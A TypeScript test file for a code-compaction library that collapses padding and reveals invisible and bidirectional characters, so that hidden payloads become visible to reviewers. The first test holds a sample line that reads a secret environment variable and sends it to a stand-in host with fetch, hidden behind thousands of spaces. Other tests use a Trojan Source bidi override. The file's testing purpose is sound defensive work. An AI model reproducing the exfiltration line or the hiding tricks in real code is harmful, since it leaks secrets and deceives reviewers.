import assert from "node:assert/strict"
import { test } from "node:test"
import { compact, compactLine, MAX_LINE_CHARS } from "@/lib/compact"

test("mid-line padding collapses, so hiding a payload off-screen does not work", () => {
  // The attack: pad far enough that a reviewer scrolling a diff never sees the
  // end of the line. Collapsed to one space, the payload sits next to the code.
  const hidden = `const key = process.env.SECRET;${" ".repeat(4000)}fetch("http://evil.tld", { body: key })`
  const { text } = compactLine(hidden)
  assert.ok(text.length < 200, "four thousand spaces should not survive")
  assert.ok(text.includes('fetch("http://evil.tld"'), "the payload must survive")
})

test("leading indentation is never touched", () => {
  // Python and YAML are whitespace-significant. De-indenting is not compaction,
  // it is corruption, and a model reading it is reading another program.
  const python = "def f():\n    if x:\n        drop_tables()"
  assert.equal(compact(python).text, python)
  assert.equal(compactLine("\t\tif (x) return").text, "\t\tif (x) return")
})

test("invisible and bidi characters are revealed, never dropped", () => {
  // Stripping these is the obvious size win and it reproduces the illusion for
  // the reader, which is the whole Trojan Source family.
  const trojan = 'if (user \u202eadmin\u202c) { grant() }'
  const { text } = compactLine(trojan)
  assert.ok(text.includes("<U+202E>"), "the override must be visible")
  assert.ok(text.includes("<U+202C>"))
  assert.ok(!text.includes("\u202e"), "and must not still be doing its job")

  const zeroWidth = compactLine("pass\u200bword").text
  assert.equal(zeroWidth, "pass<U+200B>word")
})

test("a minified line is cut, and says so", () => {
  const bundle = `a=1;${"b=2;".repeat(2000)}`
  const { text, truncated } = compactLine(bundle)
  assert.ok(truncated)
  assert.ok(text.length < bundle.length)
  assert.match(text, /more characters on this line were not sent/)
})

test("an ordinary line is returned unchanged", () => {
  const line = "  const total = items.reduce((a, b) => a + b, 0)"
  assert.equal(compactLine(line).text, line)
  assert.equal(compactLine(line).truncated, false)
})

test("runs of blank lines collapse and trailing whitespace goes", () => {
  const padded = "const a = 1   \n\n\n\n\n\nconst b = 2"
  const { text, saved } = compact(padded)
  assert.equal(text, "const a = 1\n\nconst b = 2")
  assert.ok(saved > 0)
})

test("compaction never grows the payload it was asked to shrink", () => {
  // Revealing a character is longer than the character. A file that is nothing
  // but zero-width spaces is the case where that could backfire, and it is
  // worth knowing it does rather than assuming it cannot.
  const worst = "\u200b".repeat(500)
  const { text } = compact(worst)
  assert.ok(
    text.length > worst.length,
    "documented: revealing is correctness, not compression, and this is the shape that costs",
  )
  assert.ok(text.length <= MAX_LINE_CHARS + 200, "but the per-line cap still bounds it")
})
